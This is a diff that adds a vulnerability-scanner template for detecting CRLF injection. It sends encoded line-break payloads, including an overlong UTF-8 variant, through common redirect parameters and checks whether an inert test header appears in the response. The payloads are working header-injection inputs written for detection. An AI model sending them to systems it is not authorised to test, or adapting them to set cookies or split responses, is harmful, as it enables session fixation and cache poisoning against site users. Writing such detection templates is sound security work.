@@ -1,0 +1,84 @@
+id: crlf-header-injection
+
+info:
+  name: CRLF Injection In HTTP Response Headers
+  author: p3i
+  severity: medium
+  description: Detects CRLF injection via common redirect and URL parameters that causes the application to insert attacker-controlled headers into HTTP responses. Can be escalated to session fixation, cache poisoning, XSS via Set-Cookie, or response splitting.
+  tags: misconfig,crlf,header-injection,response-splitting,web
+  metadata:
+    max-request: 36
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{crlf_path}}"
+
+    payloads:
+      crlf_path:
+        - "?next=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?url=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?redirect=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?redirect_url=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?return=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?returnUrl=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?return_url=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?continue=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?target=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?destination=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?location=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?forward=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?to=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?goto=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?out=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?uri=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?link=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?path=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "?next=%0d%0aX-CRLF-Test: injected"
+        - "?url=%0d%0aX-CRLF-Test: injected"
+        - "?redirect=%0d%0aX-CRLF-Test: injected"
+        - "?next=%0aX-CRLF-Test: injected"
+        - "?url=%0aX-CRLF-Test: injected"
+        - "?redirect=%0aX-CRLF-Test: injected"
+        - "?next=https://example.com%0aX-CRLF-Test: injected"
+        - "?url=https://example.com%0aX-CRLF-Test: injected"
+        - "?next=https://example.com%E5%98%8D%E5%98%8AX-CRLF-Test: injected"
+        - "?url=https://example.com%E5%98%8D%E5%98%8AX-CRLF-Test: injected"
+        - "?redirect=https://example.com%E5%98%8D%E5%98%8AX-CRLF-Test: injected"
+        - "?next=https://example.com%23%0d%0aX-CRLF-Test: injected"
+        - "?url=https://example.com%23%0d%0aX-CRLF-Test: injected"
+        - "login?next=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "login?return=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "auth?redirect=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "logout?next=https://example.com%0d%0aX-CRLF-Test: injected"
+        - "redirect?url=https://example.com%0d%0aX-CRLF-Test: injected"
+
+    attack: batteringram
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 303
+          - 307
+          - 308
+
+      - type: word
+        part: header
+        words:
+          - "X-CRLF-Test: injected"
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)x-crlf-test:[^\\r\\n]+"
+          - "(?i)(location|set-cookie):[^\\r\\n]*injected[^\\r\\n]*"
+      - type: dsl
+        name: status
+        dsl:
+          - "status_code"
